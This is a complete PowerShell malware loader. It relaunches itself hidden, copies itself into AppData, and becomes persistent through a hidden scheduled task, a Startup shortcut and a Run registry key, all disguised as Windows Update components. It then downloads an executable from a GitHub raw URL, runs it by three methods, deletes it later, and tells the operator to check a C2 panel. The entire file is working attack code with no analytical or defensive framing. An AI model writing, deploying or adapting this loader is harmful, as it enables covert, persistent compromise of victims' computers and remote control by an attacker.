$ErrorActionPreference = 'SilentlyContinue'

# === SELF-PRESERVATION + HIDDEN RELAUNCH ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

if ($Host.Name -eq 'ConsoleHost') {
    $null = Start-Job -ScriptBlock {
        param($path)
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$path`"" -WindowStyle Hidden
    } -ArgumentList $MyInvocation.MyCommand.Path
    exit
}

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch { exit }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}

$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE ===
$taskName = "WindowsUpdateTask"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encoded"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -StartWhenAvailable $true -Hidden $true -ExecutionTimeLimit (New-TimeSpan -Hours 2) -Priority 7
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force | Out-Null
}

$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
    $shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Caches"
    $shortcut.WindowStyle = 7
    $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"
    $shortcut.Save()
}

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateHelper"
if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
}

# === DELAY ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# === DOWNLOAD + EXECUTE (FIXED URL) ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/WindowsUpdateHelper.exe"
$exePath = "$cache\WindowsUpdateHelper.exe"

Write-Host "[DEBUG] Attempting download: $exeUrl" -ForegroundColor Yellow

if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 6
    do {
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 30 -MaximumRetryCount 3
            Write-Host "[+] EXE DOWNLOADED SUCCESSFULLY ($( (Get-Item $exePath).Length ) bytes)" -ForegroundColor Green
            break
        } catch {
            $retryCount++
            Write-Host "[-] Attempt $retryCount failed: $($_.Exception.Message)" -ForegroundColor Red
            Start-Sleep -Seconds 6
        }
    } while ($retryCount -lt $maxRetries)
}

# === EXECUTION ===
if (Test-Path $exePath) {
    Write-Host "[+] Executing WindowsUpdateHelper.exe ..." -ForegroundColor Cyan
    try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" | Out-Null } catch {}
    try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch {}
    try { Start-Process $exePath -WindowStyle Hidden } catch {}
    
    Start-Job -ScriptBlock { param($p) Start-Sleep 300; Remove-Item $p -Force } -ArgumentList $exePath | Out-Null
    Write-Host "[+] Payload should be running. Check your C2 panel." -ForegroundColor Green
} else {
    Write-Host "[-] FAILED TO DOWNLOAD EXE. Try manual download from the GitHub link." -ForegroundColor Red
}
